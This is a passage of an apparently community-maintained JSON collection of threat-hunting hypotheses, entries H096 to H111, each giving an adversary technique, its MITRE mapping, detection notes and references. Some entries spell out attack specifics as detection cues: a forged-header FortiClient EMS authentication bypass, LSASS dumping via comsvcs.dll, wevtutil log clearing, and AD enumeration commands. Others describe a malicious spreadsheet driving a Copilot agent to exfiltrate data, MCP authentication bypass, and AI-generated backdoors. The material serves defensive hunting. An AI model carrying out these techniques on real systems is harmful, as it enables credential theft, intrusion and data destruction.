    "references": "- https://attack.mitre.org/techniques/T1552/001/\n- https://attack.mitre.org/techniques/T1078/\n- https://attack.mitre.org/techniques/T1087/\n- https://www.fortiguard.com/psirt/FG-IR-24-423 (CVE-2024-47575)\n- https://www.fortiguard.com/psirt/FG-IR-24-535 (CVE-2024-55591)\n- https://kensai.app (VLM-2026-03-12-004, Mar 12 2026)",
    "file_path": "Flames/H096.md"
  },
  {
    "id": "H097",
    "category": "Flames",
    "title": "An adversary is using ClickFix lure pages impersonating legitimate software (Microsoft Teams, Homebrew, Ledger Live) to social-engineer users into executing malicious commands that deploy the Odyssey infostealer for credential and session token theft.",
    "tactic": "Execution (T1204.002)",
    "notes": "Odyssey Stealer campaign expanding from Eastern Europe to UK, Germany, Italy, Canada, Brazil, India, and Africa/Asia. Uses ClickFix technique: fake browser/app error pages instruct users to paste and run a command to \"fix\" the issue. Exclusions for CIS countries suggest Russian-aligned threat actor. Targets credentials, session tokens, and browser-stored secrets across Windows and macOS. Active as of March 2026.",
    "tags": [
      "execution",
      "initial_access",
      "clickfix",
      "infostealer",
      "odyssey_stealer",
      "social_engineering",
      "credential_theft",
      "session_hijacking",
      "T1204.002"
    ],
    "techniques": [
      "T1204.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- ClickFix bypasses most email and endpoint controls by requiring the user to manually execute the payload — no attachment, no script drop, no exploit\n- Fake pages for Teams and Homebrew are convincing to both corporate and developer targets; Ledger Live lures target crypto holders\n- The \"fix the error\" pretext creates urgency that overrides skepticism — especially effective against users who encounter legitimate IT issues\n- Command execution originates from the user's shell (cmd.exe, PowerShell, Terminal), making it appear routine and reducing EDR alert fidelity\n- CIS exclusions confirm intentional targeting of Western enterprise environments — broad industry exposure\n- Session token theft enables account takeover without credential reuse, bypassing MFA entirely",
    "references": "- https://attack.mitre.org/techniques/T1204/002/\n- https://attack.mitre.org/techniques/T1056/\n- https://attack.mitre.org/techniques/T1539/\n- https://attack.mitre.org/techniques/T1555/003/",
    "file_path": "Flames/H097.md"
  },
  {
    "id": "H098",
    "category": "Flames",
    "title": "An adversary is deploying AI-generated PowerShell backdoors as part of financially motivated ransomware intrusions, leveraging LLM-assisted code generation to produce novel malware variants that evade signature-based detection.",
    "tactic": "Execution (T1059.001)",
    "notes": "Hive0163 \"Slopoly\" campaign — financially motivated threat actor using AI-generated PowerShell for backdoor deployment. Represents expansion of AI-assisted malware beyond nation-state actors into financially motivated cybercrime. AI-generated code tends to produce functionally equivalent but syntactically diverse variants that bypass static signatures, while retaining detectable behavioral patterns (network beaconing, persistence mechanisms, staging). Active March 2026.",
    "tags": [
      "execution",
      "powershell",
      "ai_generated_malware",
      "ransomware",
      "hive0163",
      "slopoly",
      "backdoor",
      "financial_crime",
      "T1059.001"
    ],
    "techniques": [
      "T1059.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- AI-generated code produces high syntactic variability across samples, defeating hash-based and string-signature detection at scale\n- Behavioral patterns remain consistent regardless of code generation method: process injection, C2 beaconing intervals, persistence registry keys, staged payload retrieval\n- Financially motivated actors adopting AI malware generation signals the technique is now commodity — defender response time shrinks as access democratizes\n- PowerShell execution chains leave detectable artifacts in Script Block Logging, AMSI telemetry, and process tree analysis even when signatures fail\n- Hunting on behavioral TTPs (not signatures) is uniquely suited to detect AI-generated variants before new signatures are published",
    "references": "- https://attack.mitre.org/techniques/T1059/001/\n- https://attack.mitre.org/techniques/T1547/001/\n- https://attack.mitre.org/techniques/T1071/001/",
    "file_path": "Flames/H098.md"
  },
  {
    "id": "H099",
    "category": "Flames",
    "title": "An adversary is exploiting CVE-2026-26144 (Microsoft Excel + Copilot Agent zero-click vulnerability) to silently exfiltrate sensitive spreadsheet data through an AI agent execution chain without requiring any user interaction beyond opening a malicious file.",
    "tactic": "Exfiltration (T1048)",
    "notes": "CVE-2026-26144 — zero-click data exfil via Excel + Microsoft Copilot Agent. Malicious Excel file triggers Copilot Agent execution on open; agent can read and exfiltrate workbook contents without user action. Patched in Microsoft Patch Tuesday March 2026. Unpatched systems exposed to phishing/document delivery attacks. High-value targets: finance, legal, healthcare (spreadsheet-heavy data environments).",
    "tags": [
      "exfiltration",
      "cve_2026_26144",
      "microsoft_excel",
      "copilot",
      "ai_agent",
      "zero_click",
      "document_delivery",
      "patch_tuesday",
      "T1048"
    ],
    "techniques": [
      "T1048"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Zero-click exploitation requires no macro execution, no \"Enable Content\" prompt — just opening a file is sufficient, eliminating the most common user-awareness defense\n- AI agent execution chains introduce novel data access paths that traditional DLP and exfil detection rules were not designed to monitor\n- Copilot Agent activity may be logged separately from traditional Office telemetry, creating blind spots in environments without unified O365 audit logging\n- High-value spreadsheet data (financial models, PII, legal documents) is commonly stored locally or in OneDrive without additional access controls\n- Detecting unusual Copilot Agent API calls or outbound data transfers correlated with Excel open events is a reliable hunt pivot",
    "references": "- https://attack.mitre.org/techniques/T1048/\n- https://attack.mitre.org/techniques/T1566/001/\n- https://msrc.microsoft.com/update-guide/ (CVE-2026-26144, March 2026 Patch Tuesday)",
    "file_path": "Flames/H099.md"
  },
  {
    "id": "H100",
    "category": "Flames",
    "title": "An adversary is exploiting MCP server authentication bypass vulnerabilities (CVE-2026-27896 and related) to gain unauthorized tool execution access within AI agent pipelines, enabling data exfiltration, command injection, or privilege escalation through trusted agent infrastructure.",
    "tactic": "Defense Evasion (T1078)",
    "notes": "CVE cluster from March 2026 Patch Tuesday: CVE-2026-27896 (Go SDK auth bypass), CVE-2026-3484 (nmap-server RCE), CVE-2026-2178 (xcode-mcp-server), CVE-2026-29787 (mcp-memory-service info disclosure). MCP servers often run with elevated local privileges and trust; auth bypass enables adversaries to invoke tools (filesystem, network scan, memory read) without valid credentials. Emerging attack surface as MCP adoption accelerates.",
    "tags": [
      "defense_evasion",
      "initial_access",
      "mcp",
      "model_context_protocol",
      "auth_bypass",
      "cve_2026_27896",
      "ai_agent",
      "tool_execution",
      "T1078"
    ],
    "techniques": [
      "T1078"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- MCP servers run locally or in cloud environments with broad tool access (filesystem, shell, network) and are designed to trust calling agents — auth bypass eliminates the only access control\n- Most MCP server deployments lack centralized audit logging; unauthorized tool invocations may not surface in traditional SIEM pipelines\n- The Go SDK auth bypass (CVE-2026-27896) affects a foundational library, meaning many downstream MCP servers inherit the vulnerability regardless of their own security practices\n- Agent-to-agent calls through compromised MCP infrastructure enable lateral movement within AI pipeline trust chains — a novel attack path without established detection coverage\n- Hunting on unexpected MCP server connections, anomalous tool call patterns, or process spawns from MCP server processes can surface exploitation before downstream damage occurs",
    "references": "- https://attack.mitre.org/techniques/T1078/\n- https://attack.mitre.org/techniques/T1059/\n- https://modelcontextprotocol.io/",
    "file_path": "Flames/H100.md"
  },
  {
    "id": "H101",
    "category": "Flames",
    "title": "Threat actors are using compromised Microsoft Intune administrative credentials to issue remote wipe commands across enterprise-enrolled mobile devices and workstations to destroy data at scale and disrupt business operations.",
    "tactic": "Impact",
    "notes": "Based on ATT&CK technique T1485. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "impact",
      "intune",
      "mdm",
      "wiper",
      "T1485"
    ],
    "techniques": [
      "T1485"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Alan G",
      "link": ""
    },
    "why": "- Microsoft Intune provides centralized mobile device management with the capability to remotely wipe thousands of devices from a single administrative console, making it an extremely high-impact target for destructive attacks\n- The Handala group's abuse of Intune to wipe over 200,000 systems at Stryker demonstrates how legitimate enterprise management tools can be weaponized for mass data destruction, affecting critical healthcare supply chains\n- This technique is particularly dangerous because remote wipe commands are legitimate administrative functions that may bypass traditional security controls and appear as authorized actions in audit logs\n- Detection of anomalous Intune wipe operations is critical for preventing catastrophic data loss across enterprise environments, especially in sectors like healthcare where operational continuity directly impacts patient care",
    "references": "- [MITRE ATT&CK T1485 - Data Destruction](https://attack.mitre.org/techniques/T1485/)\n- [Source CTI Report](https://krebsonsecurity.com/2026/03/iran-backed-hackers-claim-wiper-attack-on-medtech-firm-stryker/)",
    "file_path": "Flames/H101.md"
  },
  {
    "id": "H102",
    "category": "Flames",
    "title": "Adversaries are deploying modified UPX-packed ARM 32-bit Big Endian malware binaries to /usr/bin/iocontrol on Linux-based IoT/OT devices to evade signature-based detection while maintaining command and control capabilities over MQTT.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1027.002. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "iocontrol",
      "ot_iot",
      "upx",
      "T1027.002"
    ],
    "techniques": [
      "T1027.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Alan G",
      "link": ""
    },
    "why": "- IOCONTROL malware uses modified UPX packing with altered magic bytes (changing \"UPX!\" to \"ABC!\") specifically to evade automated detection engines, which proved effective as the sample had zero detections in September 2024 before gradually increasing to 21 detections by December 2024\n- This obfuscation technique directly enables the deployment of a nation-state cyberweapon against critical infrastructure including fuel management systems, PLCs, HMIs, and SCADA devices across multiple vendors (Orpak, Gasboy, Unitronics, Hikvision, D-Link, and others)\n- Detection of this packing technique is critical as it precedes the establishment of persistent backdoors via /etc/rc3.d/S93InitSystemd.sh and encrypted MQTT command-and-control channels used by Iran-affiliated CyberAv3ngers (IRGC-CEC) to compromise civilian infrastructure in Israel and the United States\n- The specific binary path /usr/bin/iocontrol and the ARM architecture targeting make this highly distinctive and actionable for OT/IoT security monitoring, as legitimate software rarely uses modified packers or deploys to these specific paths on embedded Linux systems",
    "references": "- [MITRE ATT&CK T1027.002 - Obfuscated Files or Information: Software Packing](https://attack.mitre.org/techniques/T1027/002/)\n- [Source CTI Report](https://claroty.com/team82/research/inside-a-new-ot-iot-cyber-weapon-iocontrol)",
    "file_path": "Flames/H102.md"
  },
  {
    "id": "H103",
    "category": "Flames",
    "title": "Threat actors are injecting malicious pre-install and post-install scripts into package.json files of compromised npm packages to execute infostealer payloads immediately upon npm install commands in CI/CD pipelines and developer workstations.",
    "tactic": "Execution",
    "notes": "Based on ATT&CK technique T1059.007. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "execution",
      "supply_chain",
      "npm",
      "cicd",
      "T1059.007"
    ],
    "techniques": [
      "T1059.007"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "_No response_",
      "link": ""
    },
    "why": "- This technique allows attackers to achieve automatic code execution in high-privilege environments (CI/CD runners, developer machines) without requiring user interaction beyond routine package installation\n- TeamPCP successfully weaponized this method to compromise 47 additional npm packages across @emilgroup, @opengov, and @v7 namespaces in under 60 seconds, demonstrating the speed and scale of automated supply chain propagation\n- The malicious scripts execute before developers or security tools can inspect the package contents, bypassing traditional code review processes and establishing immediate footholds for credential theft and lateral movement\n- Detection of this behavior is critical as it targets the software development lifecycle itself, potentially exposing cloud credentials, API keys, and secrets that enable follow-on attacks across entire organizations\n- This technique is particularly dangerous because npm install operations are ubiquitous in modern development workflows and CI/CD pipelines, making the attack surface extremely broad",
    "references": "- [MITRE ATT&CK T1059.007 - Command and Scripting Interpreter: JavaScript](https://attack.mitre.org/techniques/T1059/007/)\n- [Source CTI Report](https://unit42.paloaltonetworks.com/teampcp-supply-chain-attacks/)",
    "file_path": "Flames/H103.md"
  },
  {
    "id": "H104",
    "category": "Flames",
    "title": "Threat actors are injecting HTTP headers X-SSL-CLIENT-VERIFY with value \"SUCCESS\" and X-SSL-CLIENT-CERT containing forged certificate chains to bypass authentication on FortiClient EMS web interfaces listening on port 443, gaining unauthorized API access to endpoint management functions.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1550.004. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "forticlient",
      "authentication_bypass",
      "T1550.004"
    ],
    "techniques": [
      "T1550.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "smossmos",
      "link": "https://github.com/smossmos"
    },
    "why": "- CVE-2026-35616 is confirmed to be exploited in the wild by Fortinet, making this an active threat requiring immediate detection\n- Successful exploitation grants attackers authenticated access to 16 certificate-authenticated API endpoints across 15 controllers, enabling them to quarantine endpoints, send commands to managed devices, reconfigure EMS settings, rotate JWT secrets, download ZTNA private keys, and export complete software inventory\n- FortiClient EMS manages entire organizational endpoint fleets, making compromise a critical pivot point for lateral movement and persistent access across all managed endpoints\n- The vulnerability affects versions 7.4.5 and 7.4.6 specifically, and detection can identify both exploitation attempts and unpatched systems through HTTP header analysis in web proxy or application logs",
    "references": "- [MITRE ATT&CK T1550.004 - Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)\n- [Source CTI Report](https://bishopfox.com/blog/api-authentication-bypass-in-forticlient-ems-7-4-5-7-4-6-cve-2026-35616)",
    "file_path": "Flames/H104.md"
  },
  {
    "id": "H105",
    "category": "Flames",
    "title": "An adversary is exploiting a known vulnerability in an internet-facing application such as Apache ActiveMQ (CVE-2023-46604) to achieve remote code execution and establish initial access to the environment.",
    "tactic": "Initial Access",
    "notes": "Focus on web application logs, WAF alerts, and endpoint telemetry from DMZ hosts. Look for ClassPathXmlApplicationContext abuse in ActiveMQ, unexpected child processes from Java/application server processes, and exploitation signatures in HTTP request bodies.",
    "tags": [
      "initial_access",
      "cve_2023_46604",
      "activemq",
      "exploit",
      "rce",
      "T1190"
    ],
    "techniques": [
      "T1190"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- CVE-2023-46604 (CVSS 10.0) in Apache ActiveMQ has been widely exploited by ransomware operators including LockBit, and exploitation requires no authentication — a single crafted OpenWire command achieves remote code execution\n- Internet-facing applications are the most common initial access vector in ransomware intrusions, and many organizations run vulnerable versions long after patches are available\n- Exploitation of public-facing applications often leaves forensic artifacts in application logs, web server logs, and endpoint telemetry that differ from normal application behavior — such as Java processes spawning cmd.exe, PowerShell, or certutil\n- Early detection of exploitation attempts at the initial access phase provides the best opportunity to contain an intrusion before lateral movement and ransomware deployment",
    "references": "- [MITRE ATT&CK T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Rapid7 - Suspected Exploitation of Apache ActiveMQ CVE-2023-46604](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/)\n- [Trend Micro - CVE-2023-46604 Exploited to Infect Systems With Cryptominers and Rootkits](https://www.trendmicro.com/en_us/research/23/k/cve-2023-46604-exploited-by-kinsing.html)\n- [Cybereason - Beware of the Messengers: Exploiting ActiveMQ Vulnerability](https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability)\n- [CISA Advisory AA23-325A - LockBit 3.0 Affiliates Exploit CVE 2023-4966 Citrix Bleed](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a)",
    "file_path": "Flames/H105.md"
  },
  {
    "id": "H106",
    "category": "Flames",
    "title": "An adversary is using named pipe impersonation or token manipulation techniques such as Meterpreter's GetSystem command to escalate privileges from a local administrator context to NT AUTHORITY\\SYSTEM on a compromised Windows host.",
    "tactic": "Privilege Escalation",
    "notes": "Look for creation of short-lived Windows services with random names, named pipe creation by non-standard processes, and token impersonation API calls (ImpersonateNamedPipeClient, DuplicateTokenEx). Sysmon Event IDs 17/18 (pipe created/connected) and 1 (process creation) with ParentUser != ChildUser are key data sources.",
    "tags": [
      "privilege_escalation",
      "named_pipe",
      "getsystem",
      "token_impersonation",
      "T1134.005",
      "T1134"
    ],
    "techniques": [
      "T1134.005",
      "T1134"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- GetSystem-style privilege escalation is a standard post-exploitation step observed in nearly every Metasploit and Cobalt Strike intrusion, and it leaves distinctive artifacts — ephemeral services with random names and named pipes that exist for only milliseconds\n- Detecting the pivot from admin to SYSTEM is a critical inflection point because SYSTEM-level access enables credential dumping from LSASS, unrestricted registry access, and the ability to manipulate security tooling\n- Named pipe impersonation creates a short-lived service (visible in System event log Event ID 7045) with a random name that immediately deletes itself after the pipe connection completes — a pattern that is highly anomalous in legitimate environments\n- Token manipulation via DuplicateTokenEx and ImpersonateNamedPipeClient leaves API call traces in EDR telemetry that differ from legitimate service account token usage",
    "references": "- [MITRE ATT&CK T1134 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)\n- [MITRE ATT&CK T1134.001 - Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Elastic - How Attackers Abuse Access Token Manipulation](https://www.elastic.co/blog/how-attackers-abuse-access-token-manipulation)\n- [Elastic Detection Rule - Privilege Escalation via Named Pipe Impersonation](https://www.elastic.co/guide/en/security/current/privilege-escalation-via-named-pipe-impersonation.html)\n- [Red Canary Atomic Red Team - T1134.001 Token Impersonation/Theft](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.md)\n- [CTID Adversary Emulation Library - Named Pipes](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes)",
    "file_path": "Flames/H106.md"
  },
  {
    "id": "H107",
    "category": "Flames",
    "title": "An adversary is clearing Windows event logs using wevtutil, Clear-EventLog, or similar utilities to destroy forensic evidence of their intrusion activity after achieving their objectives.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for Event ID 1102 (Security log cleared), Event ID 104 (System log cleared), wevtutil.exe cl executions, and PowerShell Clear-EventLog cmdlet usage. Also look for gaps in event log continuity or event logs with abnormally small file sizes.",
    "tags": [
      "defense_evasion",
      "event_log_clearing",
      "anti_forensics",
      "T1070.001"
    ],
    "techniques": [
      "T1070.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Event log clearing is one of the final actions ransomware operators take before or after deployment — in the ActiveMQ-to-LockBit intrusion, the adversary cleared System, Application, and Security event logs to hinder incident response\n- Windows generates a meta-event (Event ID 1102) when the Security log is cleared, providing a reliable detection signal even after the logs themselves are destroyed — this is a high-fidelity indicator that is rarely triggered by legitimate administrative activity\n- Adversaries who clear logs often do so selectively (e.g., clearing Security but not PowerShell Operational), so correlation across log channels can reveal the clearing activity and help reconstruct the attack timeline\n- Log forwarding to a SIEM means cleared local logs can still be analyzed, but detection of the clearing action itself signals active adversary awareness of the environment's logging capabilities",
    "references": "- [MITRE ATT&CK T1070.001 - Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Splunk Security Content - Detection: Windows Event Log Cleared](https://research.splunk.com/endpoint/ad517544-aff9-4c96-bd99-d6eb43bfbb6a/)\n- [Elastic Detection Rule - Clearing Windows Event Logs](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_clearing_windows_event_logs)\n- [Sigma Rule - Suspicious Eventlog Clear or Configuration Change](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_susp_eventlog_clear/)\n- [Red Canary Atomic Red Team - T1070.001 Clear Windows Event Logs](https://cyberbuff.github.io/TheAtomicPlaybook/tactics/defense-evasion/T1070.001.html)\n- [Unprotect Project - Clear Windows Event Logs](https://unprotect.it/technique/indicator-removal-clear-windows-event-logs/)",
    "file_path": "Flames/H107.md"
  },
  {
    "id": "H108",
    "category": "Flames",
    "title": "An adversary is dumping credentials from the LSASS process memory using tools such as Mimikatz, procdump, comsvcs.dll MiniDump, or direct API calls to access cached domain credentials for lateral movement.",
    "tactic": "Credential Access",
    "notes": "Key indicators include suspicious process access to lsass.exe with GrantedAccess values 0x1010, 0x1410, or 0x1FFFFF (Sysmon Event ID 10), unsigned binaries opening handles to LSASS, use of comsvcs.dll MiniDump via rundll32, and procdump targeting lsass.exe by PID or name.",
    "tags": [
      "credential_access",
      "lsass",
      "credential_dumping",
      "mimikatz",
      "T1003.001"
    ],
    "techniques": [
      "T1003.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- LSASS credential dumping is the most common technique for obtaining domain credentials during an intrusion — in the ActiveMQ-to-LockBit case, attackers dumped LSASS to harvest domain admin credentials that enabled RDP-based lateral movement to file servers and backup infrastructure\n- The specific GrantedAccess value 0x1010 (PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ) observed in this intrusion is a well-known signature of credential dumping tools and is rarely used by legitimate software accessing LSASS\n- Attackers increasingly use living-off-the-land techniques (comsvcs.dll MiniDump, Task Manager dumps) rather than dropping known tools like Mimikatz, requiring detection logic that focuses on the LSASS access pattern rather than specific tool signatures\n- Credential Dumping is a prerequisite for nearly all subsequent attack phases — detecting it early can prevent lateral movement, privilege escalation, and ultimately ransomware deployment",
    "references": "- [MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Splunk - You Bet Your Lsass: Hunting LSASS Access](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)\n- [Splunk Security Content - Detect Credential Dumping through LSASS Access](https://research.splunk.com/endpoint/2c365e57-4414-4540-8dc0-73ab10729996/)\n- [TrustedSec Sysmon Community Guide - Process Access](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/process-access.md)\n- [Security Scientist - 12 Questions and Answers About LSASS Memory (T1003.001)](https://www.securityscientist.net/blog/12-questions-and-answers-about-lsass-memory-t1003-001/)",
    "file_path": "Flames/H108.md"
  },
  {
    "id": "H109",
    "category": "Flames",
    "title": "An adversary is performing internal network reconnaissance by generating a spike in SMB connection attempts from a single host to many endpoints across the network, indicating enumeration of live hosts and accessible shares.",
    "tactic": "Discovery",
    "notes": "Look for a single source IP generating SMB (port 445) connections to many destinations in a short time window. Correlate with failed authentication events and compare against baseline SMB traffic patterns. Network flow data and Windows Security Event IDs 4624/4625 with Logon Type 3 are primary data sources.",
    "tags": [
      "discovery",
      "smb_scanning",
      "network_enumeration",
      "reconnaissance",
      "T1018"
    ],
    "techniques": [
      "T1018"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the ActiveMQ-to-LockBit intrusion, the beachhead host generated a significant spike in SMB traffic to systems across the network immediately after initial compromise — this scanning pattern is a reliable indicator of an adversary mapping the environment before lateral movement\n- SMB scanning from a compromised host is a pre-cursor to multiple downstream attack phases including lateral movement via PsExec, share enumeration for data staging, and identification of high-value targets like domain controllers and backup servers\n- Legitimate SMB traffic patterns are typically predictable (file servers, print servers, domain controllers) — a workstation or application server suddenly initiating SMB connections to dozens or hundreds of hosts is highly anomalous\n- Detection at the discovery phase provides a critical early warning before the adversary has moved laterally, allowing containment of the compromised host before additional systems are affected",
    "references": "- [MITRE ATT&CK T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Corelight + MITRE ATT&CK: T1018 Remote System Discovery](https://www.corelight.com/mitre-attack/discovery/t1018-remote-system-discovery)\n- [Elastic Detection Rule - Remote System Discovery Commands](https://www.elastic.co/guide/en/security/current/remote-system-discovery-commands.html)\n- [Red Canary Atomic Red Team - T1018 Remote System Discovery](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md)\n- [Picus Security - T1018 Remote System Discovery](https://www.picussecurity.com/resource/blog/t1018-remote-service-discovery-of-the-mitre-attck-framework)",
    "file_path": "Flames/H109.md"
  },
  {
    "id": "H110",
    "category": "Flames",
    "title": "An adversary is enumerating Active Directory accounts and group memberships using built-in Windows utilities such as net group, net user, nltest, or PowerShell AD cmdlets to identify privileged accounts for targeted credential theft.",
    "tactic": "Discovery",
    "notes": "Hunt for execution of net group \"Domain Admins\" /domain, net user /domain, nltest /dclist, and Get-ADGroupMember commands from non-administrative workstations or service accounts. Process creation logs (Sysmon Event ID 1, Windows Security Event ID 4688) with command-line auditing enabled are the primary data source.",
    "tags": [
      "discovery",
      "account_enumeration",
      "active_directory",
      "net_commands",
      "T1087.002",
      "T1087"
    ],
    "techniques": [
      "T1087.002",
      "T1087"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Account enumeration is a standard reconnaissance step performed shortly after initial access — in the ActiveMQ-to-LockBit intrusion, the adversary used net group commands to identify domain administrators, directly enabling targeted credential theft via LSASS dumping\n- Built-in Windows utilities like net.exe and nltest.exe are living-off-the-land tools that do not trigger traditional malware detection, but their execution from non-admin workstations or by service accounts that do not normally perform AD queries is highly suspicious\n- A burst of AD enumeration commands from a single host (especially net group, net user, whoami /all, nltest in sequence) is a strong behavioral indicator of hands-on-keyboard post-exploitation activity\n- Early detection of account enumeration can trigger containment before the adversary identifies and compromises privileged accounts that enable domain-wide access",
    "references": "- [MITRE ATT&CK T1087.002 - Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Elastic Detection Rule - Windows Account or Group Discovery](https://www.elastic.co/guide/en/security/current/windows-account-or-group-discovery.html)\n- [Red Canary Atomic Red Team - T1087.002 Domain Account Discovery](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md)\n- [CISA Eviction Strategies - Account Discovery (T1087)](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1087)",
    "file_path": "Flames/H110.md"
  },
  {
    "id": "H111",
    "category": "Flames",
    "title": "An adversary is performing network service discovery by deploying port scanning tools such as Advanced IP Scanner, SoftPerfect Network Scanner, or nmap to identify accessible services including RDP (3389), SMB (445), WinRM (5985/5986), and LDAP (389) across the internal network.",
    "tactic": "Discovery",
    "notes": "Look for execution of known scanner binaries (advanced_ip_scanner.exe, netscan.exe, nmap.exe), files masquerading as legitimate tools (e.g., scanner binary named as a different tool), and rapid sequential TCP SYN connections across multiple ports to many hosts. Network flow data showing a single host connecting to common service ports across many destinations is a key indicator.",
    "tags": [
      "discovery",
      "port_scanning",
      "network_scanning",
      "advanced_ip_scanner",
      "T1046"
    ],
    "techniques": [
      "T1046"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the ActiveMQ-to-LockBit intrusion, the adversary deployed Advanced IP Scanner disguised as SoftPerfect Network Scanner to enumerate services across the network — tool masquerading adds an additional detection opportunity based on filename/hash mismatch\n- Port scanning tools targeting specific service ports (445, 3389, 5985, 5986, 389, 135, 139) reveal the adversary's intended lateral movement methods and can predict their next steps — RDP for interactive access, SMB for PsExec, WinRM for remote command execution\n- These scanning tools are rarely used on servers in production environments, and their presence on a host that was recently compromised via an application exploit is a strong indicator of post-exploitation reconnaissance\n- Detection of port scanning activity provides an opportunity to identify not only the compromised host performing the scan but also the specific services and hosts the adversary has identified as targets",
    "references": "- [MITRE ATT&CK T1046 - Network Service Discovery](https://attack.mitre.org/techniques/T1046/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Elastic Detection Rule - Potential Network Scan Detected](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/network/discovery_potential_port_scan_detected)\n- [Splunk - Detection: Internal Vertical Port Scan](https://research.splunk.com/network/40d2dc41-9bbf-421a-a34b-8611271a6770/)\n- [Splunk Lantern - Detecting Network and Port Scanning](https://lantern.splunk.com/Security_Use_Cases/Security_Monitoring/Detecting_network_and_port_scanning)\n- [Red Canary Atomic Red Team - T1046 Network Service Scanning](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md)\n- [Microsoft Defender ATP - T1046 Network Service Scanning Hunting Queries](https://github.com/alexverboon/MDATP/blob/master/AdvancedHunting/T1046%20-%20Network%20Service%20Scanning.md)",
    "file_path": "Flames/H111.md"
  },
  {
